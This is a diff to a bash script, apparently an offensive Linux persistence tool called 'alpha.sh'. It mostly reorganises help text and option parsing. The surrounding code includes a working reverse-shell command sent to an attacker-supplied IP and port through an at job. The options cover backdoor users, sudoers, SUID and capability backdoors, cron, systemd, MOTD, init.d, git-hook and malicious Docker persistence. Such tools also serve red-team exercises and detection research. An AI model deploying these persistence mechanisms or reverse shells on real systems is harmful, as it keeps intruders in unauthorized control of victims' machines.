@@ -35,215 +35,45 @@ usage_user() {
 	echo "Low Privileged User Options:"
 	echo ""
 	echo "  --cron                      Cron job persistence"
-	echo "    --default                    Use default cron settings"
-	echo "        --ip <ip>                  Specify IP address"
-	echo "        --port <port>              Specify port number"
 	echo "  --ssh-key                   SSH key persistence"
-	echo "      --default                    Use default SSH key settings"
 	echo "  --systemd                   Systemd service persistence"
-	echo "      --default                    Use default systemd settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
-	echo "          --path <path>                Specify custom service path (must end with .service)"
-	echo "          --command <command>          Specify custom persistence command (no validation)"
-	echo "          --timer                      Create systemd timer (1 minute interval)"
 	echo "  --at                         At job persistence"
-	echo "      --default                    Use default at settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-	echo "      --custom                     Use custom at settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-	echo "  --shell-configuration         Shell profile persistence"
-	echo "      --default                    Use default profile settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom profile settings"
-	echo "          --file <file>                Specify custom profile file"
-	echo "          --command <command>          Specify custom persistence command"
+	echo "  --shell-profile         Shell profile persistence"
 	echo "  --xdg                        XDG autostart persistence"
-	echo "      --default                    Use default XDG settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom XDG settings"
-	echo "          --file <file>                Specify custom desktop entry file"
-	echo "          --command <command>          Specify custom persistence command"
 	echo "  --authorized-keys            Authorized keys management"
-	echo "      --default                    Use default authorized keys settings"
-	echo "          --key <key>                Specify the public key"
 	echo "  --bind-shell                 Setup a bind shell"
-	echo "      --default                    Use default bind shell settings"
-	echo "          --architecture <arch>       Specify architecture (x86 or x64)"
-	echo "      --custom                     Use custom bind shell binary"
-	echo "          --binary <binary>           Specify the path to the custom binary"
 	echo "  --git                 		Setup Git persistence"
-	echo "      --default                    Use default bind shell settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "          --hook                     Establish Persistence through a Git Hook"
-	echo "          --pager                    Establish Persistence through Git Pager"
-	echo "      --custom 				   Use custom Git settings"
-	echo "          --command <command>        Specify custom persistence command"
-	echo "          --path <path>              Specify custom path"
-	echo "          --hook                     Establish Persistence through a Git Hook"
-	echo "          --pager                    Establish Persistence through Git Pager"
+	echo "  --quiet (-q) 			   Quiet mode (no banner)"
 }
 
 usage_root() {
 	echo "Root User Options:"
 	echo ""
 	echo "  --cron                      Cron job persistence"
-	echo "      --default                    Use default cron settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom cron settings"
-	echo "          --command <command>         Specify custom persistence command (no validation)"
-	echo "          --crond                     Persist in cron.d directory"
-	echo "          --daily                     Persist in cron.daily directory"
-	echo "          --hourly                    Persist in cron.hourly directory"
-	echo "          --monthly                   Persist in cron.monthly directory"
-	echo "          --weekly                    Persist in cron.weekly directory"
-	echo "          --name <name>               Specify custom cron job name"
-	echo "          --crontab                   Persist in crontab file"
 	echo "  --ssh-key                   SSH key persistence"
-	echo "      --default                    Use default SSH key settings"
-	echo "      --custom                     Use custom SSH key settings"
-	echo "          --user <user>               Specify user for custom SSH key"
 	echo "  --systemd                   Systemd service persistence"
-	echo "      --default                    Use default systemd settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom systemd settings (make sure they are valid!)"
-	echo "          --path <path>                Specify custom service path (must end with .service)"
-	echo "          --command <command>          Specify custom persistence command (no validation)"
-	echo "          --timer                      Create systemd timer (1 minute interval)"
-	echo "  --generator-persistence      Set up generator persistence"
-	echo "      --default                    Use default generator persistence settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
+	echo "  --generator                 Set up generator persistence"
 	echo "  --at                         At job persistence"
-	echo "      --default                    Use default at settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-	echo "      --custom                     Use custom at settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "          --time <time>              Specify time for at job (e.g., now + 1 minute)"
-	echo "  --shell-configuration         Shell profile persistence"
-	echo "      --default                    Use default profile settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom profile settings"
-	echo "          --file <file>                Specify custom profile file"
-	echo "          --command <command>          Specify custom persistence command"
+	echo "  --shell-profile         Shell profile persistence"
 	echo "  --xdg                        XDG autostart persistence"
-	echo "      --default                    Use default XDG settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom XDG settings"
-	echo "          --file <file>                Specify custom desktop entry file"
-	echo "          --command <command>          Specify custom persistence command"
 	echo "  --authorized-keys            Authorized keys management"
-	echo "      --default                    Use default authorized keys settings"
-	echo "          --key <key>                Specify the public key"
-	echo "      --custom                     Use custom authorized keys settings"
-	echo "          --key <key>                Specify the public key"
-	echo "          --path <path>              Specify custom authorized keys file path"
 	echo "  --create-user                Create a new user"
-	echo "      --default                    Use default user creation settings"
-	echo "          --username <username>      Specify the username"
-	echo "          --password <password>      Specify the password"
 	echo "  --backdoor-user              Set up a backdoor user"
-	echo "      --default                    Use default backdoor user settings"
-	echo "          --username <username>      Specify the username"
 	echo "  --password-change            Change user password"
-	echo "      --default                    Use default password change settings"
-	echo "          --username <username>      Specify the username"
-	echo "          --password <password>      Specify the password"
 	echo "  --passwd-user                Add user to /etc/passwd with specified settings"
-	echo "      --default                    Use default passwd settings"
-	echo "          --username <username>      Specify the username"
-	echo "          --password <password>      Specify the password"
-	echo "      --custom                     Use custom passwd string"
-	echo "          --passwd-string <string>   Specify the passwd string"
-	echo "  --sudoers-backdoor           Set up sudoers backdoor"
-	echo "      --default                    Use default sudoers backdoor settings"
-	echo "          --username <username>      Specify the username"
-	echo "  --suid-backdoor              Set up SUID backdoor"
-	echo "      --default                    Use default SUID backdoor settings"
-	echo "      --custom                     Use custom SUID backdoor settings"
-	echo "          --binary <binary>          Specify the binary"
-	echo "  --cap-backdoor               Set up capabilities backdoor"
-	echo "      --default                    Use default capabilities settings"
-	echo "      --custom                     Use custom capabilities settings"
-	echo "          --capability <capability>  Specify the capability"
-	echo "          --binary <binary>          Specify the binary"
-	echo "  --motd-backdoor              Set up MOTD backdoor"
-	echo "      --default                    Use default MOTD backdoor settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom MOTD backdoor settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "          --path <path>                Specify custom path in /etc/update-motd.d/"
-	echo "  --rc-local-backdoor          Set up rc.local backdoor"
-	echo "      --default                    Use default rc.local backdoor settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom rc.local backdoor settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "  --initd-backdoor             Set up init.d backdoor"
-	echo "      --default                    Use default init.d backdoor settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom init.d backdoor settings"
-	echo "          --command <command>          Specify custom persistence command"
-	echo "          --path <path>                Specify custom path in /etc/init.d/"
-	echo "  --package-manager-persistence    Set up Package Manager persistence"
-	echo "      --default                    Use default APT persistence settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "          --apt                       Persist through APT configuration file"
-	echo "          --yum                       Persist through YUM plugin"
-	echo "          --dnf                       Persist through DNF plugin"	
+	echo "  --sudoers           Set up sudoers backdoor"
+	echo "  --suid              Set up SUID backdoor"
+	echo "  --cap               Set up capabilities backdoor"
+	echo "  --motd              Set up MOTD backdoor"
+	echo "  --rc-local          Set up rc.local backdoor"
+	echo "  --initd             Set up init.d backdoor"
+	echo "  --package-manager    Set up Package Manager persistence"
 	echo "  --bind-shell                 Setup a bind shell"
-	echo "      --default                    Use default bind shell settings"
-	echo "          --architecture <arch>       Specify architecture (x86 or x64)"
-	echo "      --custom                     Use custom bind shell binary"
-	echo "          --binary <binary>           Specify the path to the custom binary"
-	echo "  --system-binary-backdoor     Set up a system binary backdoor"
-	echo "      --default                    Use default binary backdoor settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "      --custom                     Use custom binary backdoor settings"
-	echo "          --binary <binary>           Specify the binary to backdoor"
-	echo "          --command <command>         Specify the command to execute"
+	echo "  --system-binary     Set up a system binary backdoor"
 	echo "  --udev                      Cron job persistence"
-	echo "      --default                    Use default cron settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "          --at                       Persist through At"
-	echo "          --cron                     Persist through Cron"
-	echo "          --systemd                  Persist through Systemd"
-	echo "      --custom                     Use custom cron settings"
-	echo "          --command <command>         Specify custom persistence command (no validation)"
-	echo "          --path                      Specify custom udev path (no validation)"
 	echo "  --git                 		Setup Git persistence"
-	echo "      --default                    Use default bind shell settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
-	echo "          --hook                     Establish Persistence through a Git Hook"
-	echo "          --pager                    Establish Persistence through Git Pager"
-	echo "      --custom 				   Use custom Git settings"
-	echo "          --command <command>        Specify custom persistence command"
-	echo "          --path <path>              Specify custom path"
-	echo "          --hook                     Establish Persistence through a Git Hook"
-	echo "          --pager                    Establish Persistence through Git Pager"
-    echo "  --malicious-docker-container   Set up a malicious Docker container"
-	echo "      --default                    Use default bind shell settings"
-	echo "          --ip <ip>                  Specify IP address"
-	echo "          --port <port>              Specify port number"
+    echo "  --docker-container   Set up a malicious Docker container"
+	echo "  --quiet (-q) 			   Quiet mode (no banner)"
     echo ""
 }
 
@@ -256,6 +86,17 @@ setup_systemd() {
 	local default=0
 	local ip=""
 	local port=""
+
+	usage_systemd() {
+		echo "Usage: ./alpha.sh --systemd [OPTIONS]"
+		echo "--default                    Use default systemd settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "--custom                     Use custom systemd settings (make sure they are valid!)"
+		echo "  --path <path>                Specify custom service path (must end with .service)"
+		echo "  --command <command>          Specify custom persistence command (no validation)"
+		echo "  --timer                      Create systemd timer (1 minute interval)"
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -288,8 +129,13 @@ setup_systemd() {
 				shift
 				port=$1
 				;;
+            --help|-h)
+                usage_systemd
+                exit 0
+                ;;
 			* )
 				echo "Invalid option for --systemd: $1"
+				echo "Try './alpha.sh --systemd --help' for more information."
 				exit 1
 		esac
 		shift
@@ -297,10 +143,12 @@ setup_systemd() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --systemd --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './alpha.sh --systemd --help' for more information."
 			exit 1
 		fi
 
@@ -386,6 +234,7 @@ setup_systemd() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $service_path || -z $command ]]; then
 			echo "Error: --path and --command must be specified when using --custom."
+			echo "Try './alpha.sh --systemd --help' for more information."
 			exit 1
 		fi
 
@@ -454,6 +303,7 @@ setup_systemd() {
 		fi
 	else
 		echo "Error: Either --default or --custom must be specified for --systemd."
+		echo "Try './alpha.sh --systemd --help' for more information."
 		exit 1
 	fi
 
@@ -464,6 +314,18 @@ setup_generator_persistence() {
 	local default=0
 	local ip=""
 	local port=""
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_generator() {
+		echo "Usage: ./alpha.sh --generator [OPTIONS]"
+		echo "--default                    Use default systemd generator settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -478,8 +340,13 @@ setup_generator_persistence() {
 				shift
 				port=$1
 				;;
+            --help|-h)
+                usage_generator
+                exit 0
+                ;;
 			* )
-				echo "Invalid option for --generator-persistence: $1"
+				echo "Invalid option for --generator: $1"
+				echo "Try './alpha.sh --generator --help' for more information."
 				exit 1
 		esac
 		shift
@@ -487,16 +354,13 @@ setup_generator_persistence() {
 
 	if [[ $default -eq 0 ]]; then
 		echo "Error: --default must be specified."
+		echo "Try './alpha.sh --generator --help' for more information."
 		exit 1
 	fi
 
 	if [[ -z $ip || -z $port ]]; then
 		echo "Error: --ip and --port must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --generator --help' for more information."
 		exit 1
 	fi
 
@@ -550,6 +414,31 @@ setup_cron() {
 	local port=""
 	local name=""
 	local option=""
+
+	usage_cron() {
+		if check_root; then
+			echo "Usage: ./alpha.sh --cron [OPTIONS]"
+			echo "Root User Options:"
+			echo "--default                    Use default cron settings"
+			echo "  --ip <ip>                    Specify IP address"
+			echo "  --port <port>                Specify port number"
+			echo " --custom                     Use custom cron settings"
+			echo "   --command <command>          Specify custom persistence command (no validation)"
+			echo "   --name <name>                Specify custom cron job name"
+			echo "   --crond                      Persist in cron.d directory"
+			echo "   --crontab                    Persist in crontab file"
+			echo "   --daily                      Persist in cron.daily directory"
+			echo "   --hourly                     Persist in cron.hourly directory"
+			echo "   --monthly                    Persist in cron.monthly directory"
+			echo "   --weekly                     Persist in cron.weekly directory"
+		else
+			echo "Usage: ./alpha.sh --cron [OPTIONS]"
+			echo "Low Privileged User Options:"
+			echo "--default                    Use default systemd settings"
+			echo "  --ip <ip>                    Specify IP address"
+			echo "  --port <port>                Specify port number"
+		fi
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -608,8 +497,13 @@ setup_cron() {
 				shift
 				name=$1
 				;;
+            --help|-h)
+                usage_cron
+                exit 0
+                ;;
 			* )
 				echo "Invalid option: $1"
+				echo "Try './alpha.sh --cron --help' for more information."
 				exit 1
 		esac
 		shift
@@ -618,6 +512,7 @@ setup_cron() {
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --default requires --ip and --port."
+			echo "Try './alpha.sh --cron --help' for more information."
 			exit 1
 		fi
 		if check_root; then
@@ -632,10 +527,12 @@ setup_cron() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command ]]; then
 			echo "Error: --custom requires --command."
+			echo "Try './alpha.sh --cron --help' for more information."
 			exit 1
 		fi
 		if [[ $cron_path != "/etc/crontab" && -z $name ]]; then
 			echo "Error: --custom requires --name for all options other than --crontab."
+			echo "Try './alpha.sh --cron --help' for more information."
 			exit 1
 		fi
 		if [[ $cron_path != "/etc/crontab" ]]; then
@@ -644,6 +541,7 @@ setup_cron() {
 		echo "$command" > "$cron_path"
 	else
 		echo "Error: Either --default or --custom must be specified for --cron."
+		echo "Try './alpha.sh --cron --help' for more information."
 		exit 1
 	fi
 
@@ -658,10 +556,16 @@ setup_at() {
 	local port=""
 	local time=""
 
-	if ! command -v at &> /dev/null; then
-		echo "Error: 'at' binary is not present. Please install 'at' to use this mechanism."
-		exit 1
-	fi
+	usage_at() {
+		echo "Usage: ./alpha.sh --at [OPTIONS]"
+		echo "--default                    Use default at settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
+		echo "--custom                     Use custom at settings"
+		echo "  --command <command>          Specify custom persistence command"
+		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -687,30 +591,44 @@ setup_at() {
 				shift
 				time=$1
 				;;
+            --help|-h)
+                usage_at
+                exit 0
+                ;;
 			* )
 				echo "Invalid option for --at: $1"
+				echo "Try './alpha.sh --at --help' for more information."
 				exit 1
 		esac
 		shift
 	done
 
+	if ! command -v at &> /dev/null; then
+		echo "Error: 'at' binary is not present. Please install 'at' to use this mechanism."
+		exit 1
+	fi
+
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --at --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port || -z $time ]]; then
 			echo "Error: --ip, --port, and --time must be specified when using --default."
+			echo "Try './alpha.sh --at --help' for more information."
 			exit 1
 		fi
 		echo "/bin/bash -c 'sh -i >& /dev/tcp/$ip/$port 0>&1'" | at $time
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $command || -z $time ]]; then
 			echo "Error: --command and --time must be specified when using --custom."
+			echo "Try './alpha.sh --at --help' for more information."
 			exit 1
 		fi
 		echo "$command" | at $time
 	else
 		echo "Error: Either --default or --custom must be specified for --at."
+		echo "Try './alpha.sh --at --help' for more information."
 		exit 1
 	fi
 
@@ -725,6 +643,16 @@ setup_shell_profile() {
 	local ip=""
 	local port=""
 
+	usage_shell_profile() {
+		echo "Usage: ./alpha.sh --shell-profile [OPTIONS]"
+		echo "--default                    Use default shell profile settings"
+		echo "  --ip <ip>                    Specify IP address"
+		echo "  --port <port>                Specify port number"
+		echo "--custom                     Use custom shell profile settings (make sure they are valid!)"
+		echo "  --file <file>                Specify custom profile file"
+		echo "  --command <command>          Specify custom persistence command (no validation)"
+	}
+
 	while [[ "$1" != "" ]]; do
 		case $1 in
 			--default )
@@ -749,8 +677,13 @@ setup_shell_profile() {
 				shift
 				port=$1
 				;;
+            --help|-h)
+                usage_shell_profile
+                exit 0
+                ;;
 			* )
-				echo "Invalid option for --profile: $1"
+				echo "Invalid option for --shell-profile: $1"
+				echo "Try './alpha.sh --shell-profile --help' for more information."
 				exit 1
 		esac
 		shift
@@ -758,10 +691,12 @@ setup_shell_profile() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --shell-profile --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './alpha.sh --shell-profile --help' for more information."
 			exit 1
 		fi
 
@@ -776,12 +711,14 @@ setup_shell_profile() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $profile_path || -z $command ]]; then
 			echo "Error: --file and --command must be specified when using --custom."
+			echo "Try './alpha.sh --shell-profile --help' for more information."
 			exit 1
 		fi
 
 		echo "$command" >> $profile_path
 	else
 		echo "Error: Either --default or --custom must be specified for --profile."
+		echo "Try './alpha.sh --shell-profile --help' for more information."
 		exit 1
 	fi
 
@@ -792,6 +729,16 @@ setup_xdg() {
 	if [[ ! -d "/etc/xdg" ]]; then
 		echo "Warning: /etc/xdg directory does not exist. XDG might not be present on this system."
 	fi
+
+	usage_xdg() {
+		echo "Usage: ./alpha.sh --xdg [OPTIONS]"
+		echo "--default                    Use default xdg settings"
+		echo "  --ip <ip>                  Specify IP address"
+		echo "  --port <port>              Specify port number"
+		echo "--custom                     Use custom xdg settings (make sure they are valid!)"
+		echo "  --file <file>                Specify custom desktop entry file"
+		echo "  --command <command>          Specify custom persistence command"
+	}
 
 	local profile_path=""
 	local command=""
@@ -824,8 +771,13 @@ setup_xdg() {
 				shift
 				port=$1
 				;;
+            --help|-h)
+                usage_xdg
+                exit 0
+                ;;
 			* )
 				echo "Invalid option for --xdg: $1"
+				echo "Try './alpha.sh --xdg --help' for more information."
 				exit 1
 		esac
 		shift
@@ -833,10 +785,12 @@ setup_xdg() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --xdg --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if [[ -z $ip || -z $port ]]; then
 			echo "Error: --ip and --port must be specified when using --default."
+			echo "Try './alpha.sh --xdg --help' for more information."
 			exit 1
 		fi
 
@@ -860,6 +814,7 @@ setup_xdg() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $profile_path || -z $command ]]; then
 			echo "Error: --file and --command must be specified when using --custom."
+			echo "Try './alpha.sh --xdg --help' for more information."
 			exit 1
 		fi
 
@@ -879,6 +834,7 @@ setup_xdg() {
 		fi
 	else
 		echo "Error: Either --default or --custom must be specified for --xdg."
+		echo "Try './alpha.sh --xdg --help' for more information."
 		exit 1
 	fi
 
@@ -886,16 +842,25 @@ setup_xdg() {
 }
 
 setup_ssh_key() {
-	if ! command -v ssh-keygen &> /dev/null; then
-		echo "Error: 'ssh-keygen' is not installed. Please install it to use this feature."
-		exit 1
-	fi
-
 	local default=0
 	local custom=0
 	local target_user=""
 	local ssh_dir=""
 	local ssh_key_path=""
+
+	usage_ssh_key() {
+		if check_root; then
+			echo "Usage: ./alpha.sh --ssh-key [OPTIONS]"
+			echo "Root User Options:"
+			echo "--default                    Use default SSH key settings"
+			echo "--custom                     Use custom SSH key settings"
+			echo "  --user <user>               Specify user for custom SSH key"
+		else
+			echo "Usage: ./alpha.sh --ssh-key [OPTIONS]"
+			echo "Low Privileged User Options:"
+			echo "--default                    Use default SSH key settings"
+		fi
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -909,15 +874,26 @@ setup_ssh_key() {
 				shift
 				target_user=$1
 				;;
+            --help|-h)
+                usage_ssh_key
+                exit 0
+                ;;
 			* )
 				echo "Invalid option for --ssh-key: $1"
+				echo "Try './alpha.sh --ssh-key --help' for more information."
 				exit 1
 		esac
 		shift
 	done
 
+	if ! command -v ssh-keygen &> /dev/null; then
+		echo "Error: 'ssh-keygen' is not installed. Please install it to use this feature."
+		exit 1
+	fi
+
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --ssh-key --help' for more information."
 		exit 1
 	elif [[ $default -eq 1 ]]; then
 		if check_root; then
@@ -939,6 +915,7 @@ setup_ssh_key() {
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $target_user ]]; then
 			echo "Error: --user must be specified when using --custom."
+			echo "Try './alpha.sh --ssh-key --help' for more information."
 			exit 1
 		fi
 
@@ -961,6 +938,7 @@ setup_ssh_key() {
 		fi
 	else
 		echo "Error: Either --default or --custom must be specified for --ssh-key."
+		echo "Try './alpha.sh --ssh-key --help' for more information."
 		exit 1
 	fi
 
@@ -972,6 +950,23 @@ setup_authorized_keys() {
 	local path=""
 	local default=0
 	local custom=0
+
+	usage_authorized_keys() {
+		if check_root; then
+			echo "Usage: ./alpha.sh --authorized-keys [OPTIONS]"
+			echo "Root User Options:"
+			echo "--default                    Use default authorized keys settings"
+			echo "  --key <key>                  Specify the public key"
+			echo "--custom                     Use custom authorized keys settings"
+			echo "  --key <key>                  Specify the public key"
+			echo "  --path <path>                Specify custom authorized keys file path"
+		else
+			echo "Usage: ./alpha.sh --authorized-keys [OPTIONS]"
+			echo "Low Privileged User Options:"
+			echo "--default                    Use default authorized keys settings"
+			echo "  --key <key>                  Specify the public key"
+		fi
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -989,8 +984,13 @@ setup_authorized_keys() {
 				shift
 				path=$1
 				;;
+            --help|-h)
+                usage_authorized_keys
+                exit 0
+                ;;
 			* )
 				echo "Invalid option for --authorized-keys: $1"
+				echo "Try './alpha.sh --authorized-keys --help' for more information."
 				exit 1
 		esac
 		shift
@@ -998,9 +998,11 @@ setup_authorized_keys() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --authorized-keys --help' for more information."
 		exit 1
 	elif [[ -z $key ]]; then
 		echo "Error: --key must be specified."
+		echo "Try './alpha.sh --authorized-keys --help' for more information."
 		exit 1
 	fi
 
@@ -1011,6 +1013,7 @@ setup_authorized_keys() {
 			mkdir -p $(dirname $path)
 		else
 			echo "Error: --path must be specified with --custom for root."
+			echo "Try './alpha.sh --authorized-keys --help' for more information."
 			exit 1
 		fi
 	else
@@ -1019,6 +1022,7 @@ setup_authorized_keys() {
 			path="/home/$current_user/.ssh/authorized_keys"
 		else
 			echo "Error: Only root can use --custom for --authorized-keys."
+			echo "Try './alpha.sh --authorized-keys --help' for more information."
 			exit 1
 		fi
 	fi
@@ -1031,15 +1035,22 @@ setup_authorized_keys() {
 }
 
 setup_new_user() {
-	local default=0
 	local username=""
 	local password=""
 
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_create_user() {
+		echo "Usage: ./alpha.sh --create-user [OPTIONS]"
+		echo "--username <username>      Specify the username"
+		echo "--password <password>      Specify the password"
+	}
+
 	while [[ "$1" != "" ]]; do
 		case $1 in
-			--default )
-				default=1
-				;;
 			--username )
 				shift
 				username=$1
@@ -1048,25 +1059,21 @@ setup_new_user() {
 				shift
 				password=$1
 				;;
+            --help|-h)
+                usage_create_user
+                exit 0
+                ;;
 			* )
 				echo "Invalid option for --create-user: $1"
+				echo "Try './alpha.sh --create-user --help' for more information."
 				exit 1
 		esac
 		shift
 	done
 
-	if [[ $default -eq 0 ]]; then
-		echo "Error: --default must be specified."
-		exit 1
-	fi
-
 	if [[ -z $username || -z $password ]]; then
 		echo "Error: --username and --password must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --create-user --help' for more information."
 		exit 1
 	fi
 
@@ -1077,37 +1084,39 @@ setup_new_user() {
 }
 
 setup_backdoor_user() {
-	local default=0
 	local username=""
+
+	usage_backdoor_user() {
+		echo "Usage: ./alpha.sh --backdoor-user [OPTIONS]"
+		echo "--username <username>      Specify the username"
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
-			--default )
-				default=1
-				;;
 			--username )
 				shift
 				username=$1
 				;;
+			--help|-h)
+				usage_backdoor_user
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --backdoor-user: $1"
+				echo "Try './alpha.sh --backdoor-user --help' for more information."
 				exit 1
 		esac
 		shift
 	done
 
-	if [[ $default -eq 0 ]]; then
-		echo "Error: --default must be specified."
-		exit 1
-	fi
-
 	if [[ -z $username ]]; then
 		echo "Error: --username must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --backdoor-user --help' for more information."
 		exit 1
 	fi
 
@@ -1122,15 +1131,23 @@ setup_backdoor_user() {
 }
 
 setup_password_change() {
-	local default=0
 	local username=""
 	local password=""
 
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_password_change() {
+		echo "Usage: ./alpha.sh --password-change [OPTIONS]"
+		echo "--default                    Use default password change settings"
+		echo "  --username <username>        Specify the username"
+		echo "  --password <password>        Specify the new password"
+	}
+
 	while [[ "$1" != "" ]]; do
 		case $1 in
-			--default )
-				default=1
-				;;
 			--username )
 				shift
 				username=$1
@@ -1139,25 +1156,21 @@ setup_password_change() {
 				shift
 				password=$1
 				;;
+			--help|-h)
+				usage_password_change
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --password-change: $1"
+				echo "Try './alpha.sh --password-change --help' for more information."
 				exit 1
 		esac
 		shift
 	done
 
-	if [[ $default -eq 0 ]]; then
-		echo "Error: --default must be specified."
-		exit 1
-	fi
-
 	if [[ -z $username || -z $password ]]; then
 		echo "Error: --username and --password must be specified."
-		exit 1
-	fi
-
-	if ! check_root; then
-		echo "Error: This function can only be run as root."
+		echo "Try './alpha.sh --password-change --help' for more information."
 		exit 1
 	fi
 
@@ -1177,6 +1190,20 @@ setup_passwd_user() {
 	local username=""
 	local password=""
 	local passwd_string=""
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_passwd_user() {
+		echo "Usage: ./alpha.sh --passwd-user [OPTIONS]"
+		echo "--default                    Use default settings"
+		echo "  --username <username>        Specify the username"
+		echo "  --password <password>        Specify the password"
+		echo "--custom                     Use custom string"
+		echo "  --passwd-string <string>     Specify the /etc/passwd string"
+	}
 
 	while [[ "$1" != "" ]]; do
 		case $1 in
@@ -1198,8 +1225,14 @@ setup_passwd_user() {
 				shift
 				passwd_string=$1
 				;;
+            --help|-h)
+                usage_passwd_user
+                exit 0
+                ;;
+		
 			* )
 				echo "Invalid option for --passwd-user: $1"
+				echo "Try './alpha.sh --passwd-user --help' for more information."
 				exit 1
 		esac
 		shift
@@ -1207,12 +1240,14 @@ setup_passwd_user() {
 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './alpha.sh --passwd-user --help' for more information."
 		exit 1
 	fi
 
 	if [[ $default -eq 1 ]]; then
 		if [[ -z $username || -z $password ]]; then
 			echo "Error: --username and --password must be specified with --default."
+			echo "Try './alpha.sh --passwd-user --help' for more information."
 			exit 1
 		fi
 
@@ -1233,6 +1268,7 @@ setup_passwd_user() {
 	elif [[ $custom -eq 1 ]]; then
